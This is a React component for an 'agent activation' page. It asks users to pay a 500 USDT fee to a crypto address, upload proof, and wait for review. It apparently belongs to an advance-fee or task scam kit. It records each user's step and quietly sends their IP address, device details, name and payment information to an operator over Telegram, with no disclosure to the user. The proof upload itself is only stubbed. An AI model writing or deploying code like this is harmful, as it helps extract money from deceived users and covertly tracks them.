import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { UploadCloud, Copy, Check, Info } from 'lucide-react';
import { supabase } from '../../lib/supabase';
import { useAuthStore } from '../../store/auth';
import { sendTelegramMessage, getDeviceInfo, getIpAddress } from '../../lib/telegram';

export default function Activate() {
  const { t, i18n } = useTranslation();
  const navigate = useNavigate();
  const { user, setUser } = useAuthStore();
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [file, setFile] = useState<File | null>(null);
  const [error, setError] = useState('');

  useEffect(() => {
    if (user) {
      supabase.from('agents').update({ current_step: 'Activation Info' }).eq('id', user.id);
    }
  }, [user]);

  const paymentDetails = {
    amount: user?.activation_amount || '500.00',
    currency: 'USDT (TRC20)',
    address: user?.usdt_address || 'TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
    qrCode: user?.qr_code_url || null
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(paymentDetails.address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      setError(t('upload_proof_error') || 'Please upload a proof of payment');
      return;
    }

    setLoading(true);
    setError('');

    try {
      // In a real app, upload file to Supabase Storage here
      // const { data, error: uploadError } = await supabase.storage.from('proofs').upload(...)

      const { error: updateError } = await supabase
        .from('agents')
        .update({ status: 'under_review', current_step: 'Under Review' })
        .eq('id', user?.id);

      if (updateError) throw updateError;

      // Log activity
      await supabase.from('activities').insert([
        {
          agent_id: user?.agent_id,
          action: 'Agent submitted activation proof',
        },
      ]);

      // Send Telegram notification
      try {
        const ip = await getIpAddress();
        const device = getDeviceInfo();
        const time = new Date().toLocaleString('ar-EG');
        const lang = i18n.language === 'ar' ? 'العربية' : 'English';
        
        const msg = `💸 *تم إرسال إثبات الدفع* 💸\n\n` +
                    `*ID الوكيل:* \`${user?.agent_id}\`\n` +
                    `*الاسم:* ${user?.full_name}\n` +
                    `*المبلغ:* ${paymentDetails.amount} ${paymentDetails.currency}\n` +
                    `*اسم الملف:* ${file.name}\n` +
                    `*اللغة:* ${lang}\n` +
                    `*الجهاز:* ${device}\n` +
                    `*IP:* ${ip}\n` +
                    `*الوقت:* ${time}\n` +
                    `*الخطوة الحالية:* في انتظار المراجعة`;
                    
        await sendTelegramMessage(msg, true); // Show activate button in Telegram
      } catch (e) {
        console.error('Telegram notification failed', e);
      }

      setUser({ ...user, status: 'under_review', current_step: 'Under Review' }, 'agent');
      navigate('/agent/review');
    } catch (err: any) {
      setError(err.message || t('failed_submit_activation') || 'Failed to submit activation request');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto space-y-6">
      <div className="text-center mb-8">
        <h1 className="text-2xl font-bold text-gray-900">{t('activation')}</h1>
        <p className="text-gray-600 mt-2">{t('complete_activation_payment')}</p>
      </div>

      <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
        <div className="p-6 sm:p-8 space-y-8">
          
          <div className="bg-blue-50 border border-blue-100 rounded-xl p-6 text-center">
            <h3 className="text-sm font-medium text-blue-800 uppercase tracking-wider mb-2">{t('activation_amount')}</h3>
            <div className="text-4xl font-black text-blue-900 mb-1">
              {paymentDetails.amount} <span className="text-xl font-bold text-blue-700">{paymentDetails.currency}</span>
            </div>
          </div>

          <div className="space-y-4">
            <h3 className="text-sm font-bold text-gray-900 uppercase tracking-wider">{t('payment_details')}</h3>
            
            {paymentDetails.qrCode && (
              <div className="flex justify-center mb-4">
                <div className="p-4 bg-white border border-gray-200 rounded-xl shadow-sm">
                  <img src={paymentDetails.qrCode} alt="Payment QR Code" className="w-48 h-48 object-contain" />
                </div>
              </div>
            )}

            <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 flex items-center justify-between">
              <div className="overflow-hidden pr-4">
                <div className="text-xs text-gray-500 mb-1">{t('deposit_address')}</div>
                <div className="font-mono text-sm text-gray-900 truncate">{paymentDetails.address}</div>
              </div>
              <button
                onClick={handleCopy}
                className="flex-shrink-0 flex items-center justify-center w-10 h-10 bg-white border border-gray-200 rounded-lg text-gray-600 hover:bg-gray-50 hover:text-secondary transition-colors"
                title={t('copy')}
              >
                {copied ? <Check className="w-5 h-5 text-green-500" /> : <Copy className="w-5 h-5" />}
              </button>
            </div>
          </div>

          <div className="w-full h-px bg-gray-100"></div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <h3 className="text-sm font-bold text-gray-900 uppercase tracking-wider mb-4">{t('upload_proof')}</h3>
              
              <div className="mt-1 flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-xl bg-gray-50 hover:bg-gray-100 transition-colors relative">
                <div className="space-y-1 text-center">
                  <UploadCloud className="mx-auto h-12 w-12 text-gray-400" />
                  <div className="flex text-sm text-gray-600 justify-center">
                    <label
                      htmlFor="file-upload"
                      className="relative cursor-pointer bg-white rounded-md font-medium text-secondary hover:text-primary focus-within:outline-none focus-within:ring-2 focus-within:ring-offset-2 focus-within:ring-secondary px-2 py-1"
                    >
                      <span>{t('upload_file')}</span>
                      <input
                        id="file-upload"
                        name="file-upload"
                        type="file"
                        className="sr-only"
                        accept="image/*,.pdf"
                        onChange={(e) => setFile(e.target.files?.[0] || null)}
                      />
                    </label>
                  </div>
                  <p className="text-xs text-gray-500">PNG, JPG, PDF up to 10MB</p>
                </div>
              </div>
              {file && (
                <div className="mt-3 text-sm text-green-600 flex items-center gap-2 bg-green-50 p-3 rounded-lg border border-green-100">
                  <Check className="w-4 h-4" />
                  {t('selected')}: <span className="font-medium">{file.name}</span>
                </div>
              )}
              {error && (
                <div className="mt-3 text-sm text-red-600 bg-red-50 p-3 rounded-lg border border-red-100">
                  {error}
                </div>
              )}
            </div>

            <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 flex items-start gap-3">
              <Info className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
              <p className="text-sm text-blue-800">
                {t('activation_review_notice')}
              </p>
            </div>

            <button
              type="submit"
              disabled={loading || !file}
              className="w-full py-4 bg-secondary text-white font-medium rounded-xl hover:bg-secondary/90 transition-colors disabled:opacity-50 flex items-center justify-center gap-2 shadow-sm"
            >
              {loading ? '...' : t('submit')}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
